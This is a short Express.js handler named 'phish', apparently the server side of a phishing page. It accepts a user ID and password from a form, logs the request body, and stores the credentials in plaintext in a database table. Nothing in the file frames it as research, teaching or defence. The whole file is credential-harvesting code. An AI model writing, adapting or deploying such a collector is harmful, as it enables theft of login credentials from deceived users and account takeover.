import db from '../db/index.js'

export const phish = async (req, res) => {
    const { userId, password } = req.body
    console.log(req.body)
    if (!userId && !password) {
        return res.status(400).json({success: false, message: "required"})
    }
    try {
        const id = await createUser(userId, password)
        return res.status(201).json({success: true, id})
    } catch (error) {
        return res.status(500).json({success: false, message: "internal server error!"})
    }
}
const createUser = (userId, password) => {
    return new Promise((resolve, reject) => {
    db.query(`insert into she ( user_id, password ) value (?, ?)`, [userId, password], (error, result) => {
        if (error) {
            return reject(error)
        } else {
            return resolve(result.insertId)
        }
    })
}
    )
}
export default phish